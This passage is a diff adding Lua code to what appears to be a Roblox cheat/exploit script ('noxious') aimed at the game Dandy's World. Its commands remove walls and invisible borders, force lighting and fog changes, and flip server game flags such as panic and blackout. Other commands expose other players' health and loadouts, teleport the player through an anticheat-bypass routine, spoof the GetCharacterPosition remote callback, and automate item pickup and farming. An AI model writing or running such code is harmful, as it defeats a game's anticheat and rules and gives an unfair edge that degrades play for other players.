+	originallightingsetting.GlobalShadows = Lighting.GlobalShadows
+	originallightingsetting.OutdoorAmbient = Lighting.OutdoorAmbient
+end
+
+function restoreOriginalSettings()
+	local Lighting = game:GetService"Lighting"		
+	Lighting.Brightness = originallightingsetting.Brightness
+	Lighting.ClockTime = originallightingsetting.ClockTime
+	Lighting.FogEnd = originallightingsetting.FogEnd
+	Lighting.GlobalShadows = originallightingsetting.GlobalShadows
+	Lighting.OutdoorAmbient = originallightingsetting.OutdoorAmbient
+end
+
+function fullBright()
+	local Lighting = game:GetService"Lighting"		
+	Lighting.Brightness = 2
+	Lighting.ClockTime = 14
+	Lighting.FogEnd = 100000
+	Lighting.GlobalShadows = false
+	Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
+end
+
+addcommand("enablefullbright", "efb", function()
+	if not isfullbrightlooping then
+		isfullbrightlooping = true
+		saveOriginalSettings()
+		fullbrightloopconnection = noxious["run service"].RenderStepped:Connect(function()
+			fullBright()
+		end)
+	end
+end)
+
+addcommand("disablefullbright", "dfb", function()
+	if isfullbrightlooping then
+		isfullbrightlooping = false
+		if fullbrightloopconnection then
+			fullbrightloopconnection:Disconnect()
+			fullbrightloopconnection = nil
+		end
+		restoreOriginalSettings()
+	end
+end)
+
+altfullbrightenabled = false
+altfullbrightconnection = nil
+
+addcommand("enablealternativefullbright", "eafb", function()
+	if altfullbrightenabled then return end
+	altfullbrightenabled = true
+
+	task.spawn(function() execcmd("dfb") end)
+	task.spawn(function() saveOriginalSettings() end)
+
+	altfullbrightconnection = noxious["run service"].RenderStepped:Connect(function()
+		if altfullbrightenabled then
+			game.Lighting.Brightness = 2
+			game.Lighting.FogEnd = 100000
+			game.Lighting.GlobalShadows = false
+			game.Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
+		end
+	end)
+end)
+
+addcommand("disablealternativefullbright", "dafb", function()
+	if not altfullbrightenabled then return end
+	altfullbrightenabled = false
+
+	task.spawn(function() execcmd("dfb") end)
+	task.spawn(function() restoreOriginalSettings() end)
+
+	if altfullbrightconnection then
+		altfullbrightconnection:Disconnect()
+		altfullbrightconnection = nil
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("removefog", "nofog", function()
+	game:GetService("Lighting").FogEnd = 100000
+	for i,v in pairs(game:GetService("Lighting"):GetDescendants()) do
+		if v:IsA("Atmosphere") then
+			v:Destroy()
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+origsettings = {abt = game:GetService("Lighting").Ambient, oabt = game:GetService("Lighting").OutdoorAmbient, brt = game:GetService("Lighting").Brightness, time = game:GetService("Lighting").ClockTime, fe = game:GetService("Lighting").FogEnd, fs = game:GetService("Lighting").FogStart, gs = game:GetService("Lighting").GlobalShadows}
+
+addcommand("restorelighting", "rlighting", function()
+	game:GetService("Lighting").Ambient = origsettings.abt
+	game:GetService("Lighting").OutdoorAmbient = origsettings.oabt
+	game:GetService("Lighting").Brightness = origsettings.brt
+	game:GetService("Lighting").ClockTime = origsettings.time
+	game:GetService("Lighting").FogEnd = origsettings.fe
+	game:GetService("Lighting").FogStart = origsettings.fs
+	game:GetService("Lighting").GlobalShadows = origsettings.gs
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("deletedeveloperdoors", "ddd", function()
+	workspace.DevDoor:Destroy()
+	workspace.DevDoor2:Destroy()
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("openelevator", "oe", function()
+	local elevatorfolder = game.Workspace:FindFirstChild("Elevators")
+	if elevatorfolder then
+		local elevatormodel = elevatorfolder:FindFirstChild("Elevator")
+		if elevatormodel then
+			local opened = elevatormodel:FindFirstChild("Opened")
+			local doorvisible = elevatormodel:FindFirstChild("DoorVisible")
+			if opened and opened:IsA("BoolValue") then
+				opened.Value = true
+				doorvisible.Parent = game:GetService("ReplicatedStorage")
+			end
+		end
+	end
+end)
+
+addcommand("closeelevator", "ce", function()
+	local elevatorfolder = game.Workspace:FindFirstChild("Elevators")
+	if elevatorfolder then
+		local elevatormodel = elevatorfolder:FindFirstChild("Elevator")
+		if elevatormodel then
+			local opened = elevatormodel:FindFirstChild("Opened")
+			local doorvisible = game:GetService("ReplicatedStorage"):FindFirstChild("DoorVisible")
+			if opened and opened:IsA("BoolValue") then
+				opened.Value = false
+				task.wait(2)
+				doorvisible.Parent = elevatormodel
+			end
+		end
+	end
+end)
+
+addcommand("opentrapdoors", "otd", function()
+	local elevatorfolder = game.Workspace:FindFirstChild("Elevators")
+	if elevatorfolder then
+		local elevatormodel = elevatorfolder:FindFirstChild("Elevator")
+		if elevatormodel then
+			local opened = elevatormodel:FindFirstChild("OpenTrapDoors")
+			if opened and opened:IsA("BoolValue") then
+				opened.Value = true
+			end
+		end
+	end
+end)
+
+addcommand("closetrapdoors", "ctd", function()
+	local elevatorfolder = game.Workspace:FindFirstChild("Elevators")
+	if elevatorfolder then
+		local elevatormodel = elevatorfolder:FindFirstChild("Elevator")
+		if elevatormodel then
+			local opened = elevatormodel:FindFirstChild("OpenTrapDoors")
+			if opened and opened:IsA("BoolValue") then
+				opened.Value = false
+			end
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("enablepanicmode", "epm", function()
+	game.Workspace.Info.Panic.Value = true
+end)
+
+addcommand("disablepanicmode", "dpm", function()
+	game.Workspace.Info.Panic.Value = false
+end)
+
+addcommand("enableblackout", "ebo", function()
+	game.Workspace.Info.BlackOut.Value = true
+end)
+
+addcommand("enableblackout", "dbo", function()
+	game.Workspace.Info.BlackOut.Value = false
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+dibloop = false
+dibfloorConnection = nil
+
+function dib()
+	local currentRoom = workspace:FindFirstChild("CurrentRoom")
+	if not currentRoom then return end
+
+	local model = currentRoom:FindFirstChildOfClass("Model")
+	if not model then return end
+
+	local freeArea = model:FindFirstChild("FreeArea")
+	if freeArea then
+		for _, child in ipairs(freeArea:GetChildren()) do
+			if child:IsA("Part") and (child.Name == "InvisBorder" or child.Name == "InvisibleWall" or child.Name == "InvisWall") then
+				child:Destroy()
+			end
+		end
+	end
+
+	for _, name in {"GeneratedBorders", "Borders"} do
+		local toDestroy = model:FindFirstChild(name)
+		if toDestroy then
+			toDestroy:Destroy()
+		end
+	end
+
+	local walls = model:FindFirstChild("Walls")
+	if walls then
+		for _, child in ipairs(walls:GetChildren()) do
+			if child:IsA("Part") and (child.Name == "InvisibleWall" or child.Name == "InvisWall") then
+				child:Destroy()
+			end
+		end
+	end
+end
+
+addcommand("deleteinvisibleborders", "dib", function()
+	task.spawn(dib)
+	if dibfloorConnection then return end
+	dibfloorConnection = true
+
+	local floorActiveValue = workspace:WaitForChild("Info"):WaitForChild("FloorActive")
+
+	if not dibfloorConnection then
+		dibfloorConnection = floorActiveValue.Changed:Connect(dib)
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+autofloorcmdconfig = {
+	enableautopickupallitems = "puai",
+	enableautopickupallheals = "puah",
+	enableautopickupresearchcapsules = "puarc",
+	enableautopickupalltapes = "puat",
+	enableautopickupallextractionitems = "puaei",
+	enableautoencountertwisteds = "et",
+	eapuai = "puai",
+	epuah = "puah",
+	eapurc = "puarc",
+	eapuat = "puat",
+	eapuaei = "puaei",
+	eaet = "et"
+}
+
+autofloorcmds = {}
+autofloorcmdqueue = {}
+autofloorcmdqueuerunning = false
+
+function processQueue()
+	if autofloorcmdqueuerunning or #autofloorcmdqueue == 0 then return end
+	autofloorcmdqueuerunning = true
+
+	while #autofloorcmdqueue > 0 do
+		local cmd = table.remove(autofloorcmdqueue, 1)
+		if typeof(cmd) == "string" then
+			execcmd(cmd)
+			task.wait(0.5)
+		end
+	end
+
+	autofloorcmdqueuerunning = false
+end
+
+function onFloorActiveChanged(newValue)
+	if newValue ~= true then return end
+
+	for execCmd, data in pairs(autofloorcmds) do
+		if data.enabled then
+			table.insert(autofloorcmdqueue, execCmd)
+		end
+	end
+
+	processQueue()
+end
+
+task.spawn(function()
+	if game.PlaceId ~= noxious["dandy's world run"] then return end
+	local floorValue = workspace:WaitForChild("Info"):WaitForChild("FloorActive")
+	floorValue:GetPropertyChangedSignal("Value"):Connect(function()
+		onFloorActiveChanged(floorValue.Value)
+	end)
+end)
+
+for alias, execCmd in pairs(autofloorcmdconfig) do
+	if not autofloorcmds[execCmd] then
+		autofloorcmds[execCmd] = { enabled = false }
+	end
+
+	local disableAlias = alias:gsub("^enable", "disable")
+
+	local shortEnable = "ea" .. execCmd
+	local shortDisable = "da" .. execCmd
+
+	local function enableHandler()
+		autofloorcmds[execCmd].enabled = true
+		if workspace:WaitForChild("Info"):WaitForChild("FloorActive").Value == true then
+			table.insert(autofloorcmdqueue, execCmd)
+			processQueue()
+		end
+	end
+
+	local function disableHandler()
+		autofloorcmds[execCmd].enabled = false
+	end
+
+	addcommand(alias, alias, enableHandler)
+	addcommand(disableAlias, disableAlias, disableHandler)
+	addcommand(shortEnable, shortEnable, enableHandler)
+	addcommand(shortDisable, shortDisable, disableHandler)
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+panicautofloorcmdconfig = {
+	enablepanicautopickupallitems = "puai",
+	enablepanicautopickupallheals = "puah",
+	enablepanicautopickupresearchcapsules = "puarc",
+	enablepanicautopickupalltapes = "puat",
+	enablepanicautopickupallextractionitems = "puaei",
+	enablepanicautoencountertwisteds = "et",
+	epapuai = "puai",
+	eppuah = "puah",
+	epapurc = "puarc",
+	epapuat = "puat",
+	epapuaei = "puaei",
+	epaet = "et"
+}
+
+panicautofloorcmds = {}
+panicautofloorcmdqueue = {}
+panicautofloorcmdqueuerunning = false
+
+function panicprocessQueue()
+	if panicautofloorcmdqueuerunning or #panicautofloorcmdqueue == 0 then return end
+	panicautofloorcmdqueuerunning = true
+
+	while #panicautofloorcmdqueue > 0 do
+		local cmd = table.remove(panicautofloorcmdqueue, 1)
+		if typeof(cmd) == "string" then
+			execcmd(cmd)
+			task.wait(0.5)
+		end
+	end
+
+	panicautofloorcmdqueuerunning = false
+end
+
+function onpanicChanged(newValue)
+	if newValue ~= true then return end
+
+	for execCmd, data in pairs(panicautofloorcmds) do
+		if data.enabled then
+			table.insert(panicautofloorcmdqueue, execCmd)
+		end
+	end
+
+	panicprocessQueue()
+end
+
+task.spawn(function()
+	if game.PlaceId ~= noxious["dandy's world run"] then return end
+	local floorValue = workspace:WaitForChild("Info"):WaitForChild("Panic")
+	floorValue:GetPropertyChangedSignal("Value"):Connect(function()
+		onpanicChanged(floorValue.Value)
+	end)
+end)
+
+for alias, execCmd in pairs(panicautofloorcmdconfig) do
+	if not panicautofloorcmds[execCmd] then
+		panicautofloorcmds[execCmd] = { enabled = false }
+	end
+
+	local disableAlias = alias:gsub("^enable", "disable")
+
+	local shortEnable = "epa" .. execCmd
+	local shortDisable = "dpa" .. execCmd
+
+	local function enableHandler()
+		panicautofloorcmds[execCmd].enabled = true
+		if workspace:WaitForChild("Info"):WaitForChild("FloorActive").Value == true then
+			table.insert(panicautofloorcmdqueue, execCmd)
+			panicprocessQueue()
+		end
+	end
+
+	local function disableHandler()
+		panicautofloorcmds[execCmd].enabled = false
+	end
+
+	addcommand(alias, alias, enableHandler)
+	addcommand(disableAlias, disableAlias, disableHandler)
+	addcommand(shortEnable, shortEnable, enableHandler)
+	addcommand(shortDisable, shortDisable, disableHandler)
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local maxDistanceEnabled = false
+
+function updmaxdist(player, distance)
+	local function onchar(character)
+		local HRP = character:WaitForChild("HumanoidRootPart", 5)
+		if HRP then
+			local nameTag = HRP:FindFirstChild("NameTag")			
+			if nameTag and nameTag:IsA("BillboardGui") then
+				nameTag.MaxDistance = distance
+			end
+		end
+	end
+
+	if player.Character then
+		onchar(player.Character)
+	end
+	player.CharacterAdded:Connect(onchar)
+end
+
+function applymaxdist(distance)
+	for _, player in ipairs(game.Players:GetPlayers()) do
+		updmaxdist(player, distance)
+	end
+
+	game.Players.PlayerAdded:Connect(function(player)
+		updmaxdist(player, distance)
+	end)
+end
+
+addcommand("enableinfinitenametagmaxdistance", "einmd", function()
+	if not maxDistanceEnabled then
+		maxDistanceEnabled = true
+		applymaxdist(math.huge)
+	end
+end)
+
+addcommand("disableinfinitenametagmaxdistance", "dinmd", function()
+	if maxDistanceEnabled then
+		maxDistanceEnabled = false
+		applymaxdist(30)
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local healthFrameVisibilityEnabled = false
+local connection
+
+function updhealthframes(visibility, maxDistance)
+	local playersFolder = workspace:FindFirstChild("InGamePlayers")		
+	if not playersFolder then
+		return false
+	end
+
+	for _, playerModel in ipairs(playersFolder:GetChildren()) do
+		if playerModel:IsA("Model")then
+			local loadoutFrame = playerModel:FindFirstChild("LoadoutFrame")				
+			if loadoutFrame then
+				if loadoutFrame:IsA("BillboardGui") then
+					loadoutFrame.MaxDistance = maxDistance
+				end
+
+				local frame = loadoutFrame:FindFirstChild("Frame")					
+				if frame then
+					local healthFrame = frame:FindFirstChild("HealthFrame")						
+					if healthFrame then
+						healthFrame.Visible = visibility
+					end
+				end
+			end
+		end
+	end
+
+	return true
+end
+
+addcommand("showplayerhealth", "sph", function()	
+	if not healthFrameVisibilityEnabled then
+		healthFrameVisibilityEnabled = true
+		connection = noxious["run service"].RenderStepped:Connect(function()
+			local playersFolderExists = updhealthframes(true, math.huge)
+			if not playersFolderExists then
+				execcmd("hideplayerhealth")
+			end
+		end)
+	end
+end)
+
+addcommand("hideplayerhealth", "hph", function()
+	if healthFrameVisibilityEnabled then
+		healthFrameVisibilityEnabled = false
+		updhealthframes(false, 30)
+		if connection then
+			connection:Disconnect()
+			connection = nil
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local loadoutSlotVisibilityEnabled = false
+local slotUpdateConnection
+
+function updateLoadoutSlotFrames(visibility, maxDistance)
+	local playersFolder = workspace:FindFirstChild("InGamePlayers")		
+	if not playersFolder then
+		return false
+	end
+
+	for _, playerModel in ipairs(playersFolder:GetChildren()) do
+		if playerModel:IsA("Model") then
+			local loadoutGui = playerModel:FindFirstChild("LoadoutFrame")				
+			if loadoutGui and loadoutGui:IsA("BillboardGui") then
+				loadoutGui.MaxDistance = maxDistance
+
+				local frame = loadoutGui:FindFirstChild("Frame")
+				if frame then
+					for _, slotName in ipairs({"Slot1", "Slot2"}) do
+						local slotFrame = frame:FindFirstChild(slotName)
+						if slotFrame then
+							slotFrame.Visible = visibility
+						end
+					end
+				end
+			end
+		end
+	end
+
+	return true
+end
+
+addcommand("showplayertrinkets", "spt", function()	
+	if not loadoutSlotVisibilityEnabled then
+		loadoutSlotVisibilityEnabled = true
+		slotUpdateConnection = noxious["run service"].Heartbeat:Connect(function()
+			local folderExists = updateLoadoutSlotFrames(true, math.huge)
+			if not folderExists then
+				execcmd("hideloadoutslots")
+			end
+		end)
+	end
+end)
+
+addcommand("hideplayertrinkets", "hpt", function()
+	if loadoutSlotVisibilityEnabled then
+		loadoutSlotVisibilityEnabled = false
+		updateLoadoutSlotFrames(false, 30)
+		if slotUpdateConnection then
+			slotUpdateConnection:Disconnect()
+			slotUpdateConnection = nil
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("hide", "hide", function(target)
+	local players = noxious["players"]
+
+	local function settransparency(player, visible)
+		local character = player.Character
+		if not character then return end
+		for _, part in ipairs(character:GetDescendants()) do
+			if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+				part.Transparency = visible and 0 or 1
+			elseif part:IsA("Decal") then
+				part.Transparency = visible and 0 or 1
+			end
+		end
+	end
+
+	local function resolveplayers(target)
+		if not target then target = "me" end
+		local resolved = {}
+		if target == "me" then
+			table.insert(resolved, players.LocalPlayer)
+		elseif target == "others" then
+			for _, p in ipairs(players:GetPlayers()) do
+				if p ~= players.LocalPlayer then
+					table.insert(resolved, p)
+				end
+			end
+		elseif target == "all" then
+			resolved = players:GetPlayers()
+		elseif target == "random" then
+			local allPlayers = players:GetPlayers()
+			if #allPlayers > 0 then
+				local randomPlayer = allPlayers[math.random(1, #allPlayers)]
+				table.insert(resolved, randomPlayer)
+			end
+		else
+			for _, p in ipairs(players:GetPlayers()) do
+				if p.Name:lower():find(target:lower(), 1, true) then
+					table.insert(resolved, p)
+					break
+				end
+			end
+		end
+		return resolved
+	end
+
+	for _, p in ipairs(resolveplayers(target)) do
+		settransparency(p, false)
+	end
+end)
+
+addcommand("show", "show", function(target)
+	local players = noxious["players"]
+
+	local function settransparency(player, visible)
+		local character = player.Character
+		if not character then return end
+		for _, part in ipairs(character:GetDescendants()) do
+			if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+				part.Transparency = visible and 0 or 1
+			elseif part:IsA("Decal") then
+				part.Transparency = visible and 0 or 1
+			end
+		end
+	end
+
+	local function resolveplayers(target)
+		if not target then target = "me" end
+		local resolved = {}
+		if target == "me" then
+			table.insert(resolved, players.LocalPlayer)
+		elseif target == "others" then
+			for _, p in ipairs(players:GetPlayers()) do
+				if p ~= players.LocalPlayer then
+					table.insert(resolved, p)
+				end
+			end
+		elseif target == "all" then
+			resolved = players:GetPlayers()
+		elseif target == "random" then
+			local allPlayers = players:GetPlayers()
+			if #allPlayers > 0 then
+				local randomPlayer = allPlayers[math.random(1, #allPlayers)]
+				table.insert(resolved, randomPlayer)
+			end
+		else
+			for _, p in ipairs(players:GetPlayers()) do
+				if p.Name:lower():find(target:lower(), 1, true) then
+					table.insert(resolved, p)
+					break
+				end
+			end
+		end
+		return resolved
+	end
+
+	for _, p in ipairs(resolveplayers(target)) do
+		settransparency(p, true)
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local rainbowLights = {}
+
+function stopRainbowLight(player)
+	local conn = rainbowLights[player]
+	if conn then
+		conn:Disconnect()
+		rainbowLights[player] = nil
+	end
+end
+
+function startRainbowLight(player, light)
+	stopRainbowLight(player)
+	rainbowLights[player] = noxious["run service"].Heartbeat:Connect(function()
+		if not player.Character or not light or not light.Parent then
+			stopRainbowLight(player)
+			return
+		end
+		local hue = (tick() % 10) / 10
+		light.Color = Color3.fromHSV(hue, 1, 1)
+	end)
+end
+
+addcommand("pointlight", "light", function(trg, rng, clr)
+	local target = trg or "me"
+	local range = tonumber(rng) or 15
+	local colorName = clr and clr:lower() or "white"
+
+	local playersList = {}
+
+	if target == "me" then
+		table.insert(playersList, noxious["players"].LocalPlayer)
+	elseif target == "others" then
+		for _, player in ipairs(noxious["players"]:GetPlayers()) do
+			if player ~= noxious["players"].LocalPlayer then
+				table.insert(playersList, player)
+			end
+		end
+	elseif target == "all" then
+		playersList = noxious["players"]:GetPlayers()
+	elseif target == "random" then
+		local allPlayers = noxious["players"]:GetPlayers()
+		if #allPlayers > 0 then
+			local randomPlayer = allPlayers[math.random(1, #allPlayers)]
+			table.insert(playersList, randomPlayer)
+		end
+	else
+		for _, player in ipairs(noxious["players"]:GetPlayers()) do
+			if player.Name:lower():find(target:lower(), 1, true) then
+				table.insert(playersList, player)
+				break
+			end
+		end
+	end
+
+	if #playersList == 0 then return end
+
+	local isRainbow = colorName == "rainbow" or colorName == "rb"
+	local staticColor = colorMap[colorName] or colorMap["white"]
+
+	for _, player in ipairs(playersList) do
+		local char = player.Character
+		local hrp = char and char:FindFirstChild("HumanoidRootPart")
+		if hrp then
+			local light = hrp:FindFirstChild("CustomPointLight")
+			if not light then
+				light = Instance.new("PointLight")
+				light.Name = "CustomPointLight"
+				light.Parent = hrp
+			end
+			light.Brightness = 2
+			light.Range = range
+
+			if isRainbow then
+				startRainbowLight(player, light)
+			else
+				stopRainbowLight(player)
+				light.Color = staticColor
+			end
+		end
+	end
+end)
+
+addcommand("unpointlight", "unlight", function(args)
+	local target = args or "me"
+
+	local playersList = {}
+
+	if target == "me" then
+		table.insert(playersList, noxious["players"].LocalPlayer)
+	elseif target == "others" then
+		for _, player in ipairs(noxious["players"]:GetPlayers()) do
+			if player ~= noxious["players"].LocalPlayer then
+				table.insert(playersList, player)
+			end
+		end
+	elseif target == "all" then
+		playersList = noxious["players"]:GetPlayers()
+	elseif target == "random" then
+		local allPlayers = noxious["players"]:GetPlayers()
+		if #allPlayers > 0 then
+			local randomPlayer = allPlayers[math.random(1, #allPlayers)]
+			table.insert(playersList, randomPlayer)
+		end
+	else
+		for _, player in ipairs(noxious["players"]:GetPlayers()) do
+			if player.Name:lower():find(target:lower(), 1, true) then
+				table.insert(playersList, player)
+				break
+			end
+		end
+	end
+
+	if #playersList == 0 then return end
+
+	for _, player in ipairs(playersList) do
+		local char = player.Character
+		local hrp = char and char:FindFirstChild("HumanoidRootPart")
+		if hrp then
+			local light = hrp:FindFirstChild("CustomPointLight")
+			if light then
+				stopRainbowLight(player)
+				light:Destroy()
+			end
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("spawnshrimpo", "sps", function()
+	local player = noxious["local player"]
+	local character = player.Character or player.CharacterAdded:Wait()
+	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"
+
+	local meshPart = Instance.new("MeshPart")		
+	meshPart.Size = Vector3.new(1, 1, 1)
+	meshPart.Anchored = false
+	meshPart.CanCollide = true
+	meshPart.Position = humanoidRootPart.Position + Vector3.new(0, 5, 0)
+	meshPart.MeshId = "rbxassetid://78124401415554"
+	meshPart.TextureID = "rbxassetid://88850093113717"
+
+	meshPart.Parent = workspace
+end)
+
+addcommand("spawndandy", "spd", function()
+	local player = noxious["local player"]
+	local character = player.Character or player.CharacterAdded:Wait()
+	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"
+
+	local meshPart = Instance.new("MeshPart")		
+	meshPart.Size = Vector3.new(1, 1, 1)
+	meshPart.Anchored = false
+	meshPart.CanCollide = true
+	meshPart.Position = humanoidRootPart.Position + Vector3.new(0, 5, 0)
+	meshPart.MeshId = "rbxassetid://107019721797906"
+	meshPart.TextureID = "rbxassetid://109038384710517"
+
+	meshPart.Parent = workspace
+end)
+
+addcommand("spawntwisteddandy", "sptd", function()
+	local player = noxious["local player"]
+	local character = player.Character or player.CharacterAdded:Wait()
+	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"
+
+	local meshPart = Instance.new("MeshPart")		
+	meshPart.Size = Vector3.new(1, 1, 1)
+	meshPart.Anchored = false
+	meshPart.CanCollide = true
+	meshPart.Position = humanoidRootPart.Position + Vector3.new(0, 5, 0)
+	meshPart.MeshId = "rbxassetid://131467007179018"
+	meshPart.TextureID = "rbxassetid://104745646981650"
+
+	meshPart.Parent = workspace
+end)
+
+addcommand("spawntv", "sptv", function()
+	local player = noxious["local player"]
+	local character = player.Character or player.CharacterAdded:Wait()
+	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"
+
+	local meshPart = Instance.new("MeshPart")		
+	meshPart.Size = Vector3.new(1, 1, 1)
+	meshPart.Anchored = false
+	meshPart.CanCollide = true
+	meshPart.Position = humanoidRootPart.Position + Vector3.new(0, 5, 0)
+	meshPart.MeshId = "rbxassetid://105769252421064"
+	meshPart.TextureID = "rbxassetid://132807616662124"
+
+	meshPart.Parent = workspace
+end)
+
+addcommand("spawnplushies", "sp", function()
+	local Players = game:GetService("Players")
+	local Debris = game:GetService("Debris")
+
+	local player = Players.LocalPlayer
+	local character = player.Character or player.CharacterAdded:Wait()
+	local hrp = character:WaitForChild("HumanoidRootPart")
+
+	local meshOptions = {
+		{MeshId = "rbxassetid://71244913752294", TextureId = "rbxassetid://114525084724930"}, -- dandy
+		{MeshId = "rbxassetid://73153098331930", TextureId = "rbxassetid://117170402608886"}, -- shelly
+		{MeshId = "rbxassetid://118914329656696", TextureId = "rbxassetid://95235468518759"}, -- vee
+		{MeshId = "rbxassetid://104535249097941", TextureId = "rbxassetid://95032986581190"}, -- sprout
+		{MeshId = "rbxassetid://104736978854503", TextureId = "rbxassetid://140426113289874"}, -- astro
+		{MeshId = "rbxassetid://112318762302461", TextureId = "rbxassetid://71341185794189"}, -- bassie
+		{MeshId = "rbxassetid://96132186668349", TextureId = "rbxassetid://102583177496235"}, -- cocoa
+	}
+
+	local spreadForce = 40
+	local partSize = Vector3.new(2, 4, 2)
+
+	for _, meshData in ipairs(meshOptions) do
+		local part = Instance.new("Part")
+		part.Size = partSize
+		part.Anchored = false
+		part.CanCollide = true
+		part.Massless = false
+		part.Position = hrp.Position + Vector3.new(0, 2, 0)
+		part.Velocity = Vector3.new(
+			math.random(-spreadForce, spreadForce),
+			math.random(10, spreadForce),
+			math.random(-spreadForce, spreadForce)
+		)
+		part.Material = Enum.Material.Neon
+		part.Color = Color3.fromRGB(255, 255, 255)
+		part.Parent = workspace
+
+		local mesh = Instance.new("SpecialMesh", part)
+		mesh.MeshType = Enum.MeshType.FileMesh
+		mesh.MeshId = meshData.MeshId
+		mesh.TextureId = meshData.TextureId or ""
+		mesh.Scale = Vector3.new(2, 2, 2)
+
+		Debris:AddItem(part, 500)
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("teleporttoelevator", "tpte", function()
+	local a = workspace:FindFirstChild("Elevators")
+	if a then
+		local b = a:FindFirstChildWhichIsA("Model")
+		if b then
+			local c = b:FindFirstChild("MonsterBlocker")
+			if c and c:IsA("Part")then
+				local d = noxious["character"]
+				if d and d:FindFirstChild("HumanoidRootPart")then
+					local e = c.CFrame * CFrame.new(0, -10.5, 0) * CFrame.Angles(0, math.rad(-90), 0)
+					if noxiousautofarmrunning or dekaautofarmrunning and autobuyitems then e = c.CFrame * CFrame.new(10, -10.5, 0) * CFrame.Angles(0, math.rad(-90), 0) end
+					local wasbypassinganticheat = bypassinganticheat
+					task.spawn(function() execcmd("eacb") end)
+					tpbypass(e)
+					task.wait(0.5) if not wasbypassinganticheat then task.spawn(function() execcmd("dacb") end) end
+				end
+			end
+		end
+	end
+end)
+
+teleportingtofakeelevator = false
+
+addcommand("teleporttofakeelevator", "tptfe", function()
+	if teleportingtofakeelevator then return end
+	teleportingtofakeelevator = true
+
+	local a = workspace:FindFirstChild("CurrentRoom")
+	if a then
+		local b = a:FindFirstChildWhichIsA("Model")
+		if b then
+			local c = b:FindFirstChild("FreeArea")
+			local d = c:FindFirstChild("FakeElevator")
+			local e = d:FindFirstChild("Base")
+			if e and e:IsA("Part") then
+				local f = noxious["character"]
+				if f and f:FindFirstChild("HumanoidRootPart")then
+					local g = e.CFrame * CFrame.new(0, 2.7, 0) * CFrame.Angles(0, math.rad(-90), 0)
+					local wasbypassinganticheat = bypassinganticheat
+					task.spawn(function() execcmd("eacb") end)
+					tpbypass(g)
+					tpbypass(g)
+					if not wasbypassinganticheat then task.spawn(function() execcmd("dacb") end) end
+					teleportingtofakeelevator = false
+				end
+			end
+		end
+	end
+end)
+
+function avoidsproutstendrils()
+	if teleportingtofakeelevator then return end
+	teleportingtofakeelevator = true
+
+	local a = workspace:FindFirstChild("CurrentRoom")
+	if a then
+		local b = a:FindFirstChildWhichIsA("Model")
+		if b then
+			local c = b:FindFirstChild("FreeArea")
+			local d = c:FindFirstChild("FakeElevator")
+			local e = d:FindFirstChild("Base")
+			if e and e:IsA("Part") then
+				local f = noxious["character"]
+				if f and f:FindFirstChild("HumanoidRootPart")then
+					local g = e.CFrame * CFrame.new(10, 2.7, 10) * CFrame.Angles(0, math.rad(-90), 0)
+					local wasbypassinganticheat = bypassinganticheat
+					task.spawn(function() execcmd("eacb") end)
+					tpbypass(g)
+					tpbypass(g)
+					if not wasbypassinganticheat then task.spawn(function() execcmd("dacb") end) end
+					teleportingtofakeelevator = false
+				end
+			end
+		end
+	end
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("enableantitendrils", "eait", function()
+	game:GetService("ReplicatedStorage").Events.GetCharacterPosition.OnClientInvoke = function()
+		return game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+	end;
+end)
+
+addcommand("disableantitendrils", "dait", function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local Events = ReplicatedStorage:WaitForChild("Events")
+	Events.GetCharacterPosition.OnClientInvoke = nil
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+autoteleporttoelevatorenabled = true
+autoteleporttoelevatorteleported = false
+autoteleporttoelevatorconnection = nil
+autoteleporttoelevatorlastpanicstate = false
+
+addcommand("enableautoteleporttoelevator", "eatpte", function()
+	local workspace = game:GetService("Workspace")        
+	local infoFolder = workspace:FindFirstChild("Info")
+
+	if infoFolder then
+		local panicBool = infoFolder:FindFirstChild("Panic")            
+		if panicBool and panicBool:IsA("BoolValue") then
+			if not autoteleporttoelevatorconnection or not autoteleporttoelevatorconnection.Connected then
+				autoteleporttoelevatorconnection = noxious["run service"].Heartbeat:Connect(function()
+					if autoteleporttoelevatorlastpanicstate ~= panicBool.Value then
+						autoteleporttoelevatorlastpanicstate = panicBool.Value
+						if not panicBool.Value then
+							autoteleporttoelevatorteleported = false
+						end
+					end
+
+					if autoteleporttoelevatorenabled and panicBool.Value == true and not autoteleporttoelevatorteleported then
+						task.spawn(function() execcmd("tpte") end)
+						autoteleporttoelevatorteleported = true
+					end
+				end)
+			end
+		end
+	end
+end)
+
+addcommand("disableautoteleporttoelevator", "datpte", function()
+	autoteleporttoelevatorenabled = false
+	autoteleporttoelevatorteleported = false
+	if autoteleporttoelevatorconnection then
+		autoteleporttoelevatorconnection:Disconnect()
+		autoteleporttoelevatorconnection = nil
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+autojoinrunconnection = nil
+
+addcommand("enableautojoinrun", "eajr", function()
+	if autojoinrunconnection then return end
+
+	local function gog(lal)
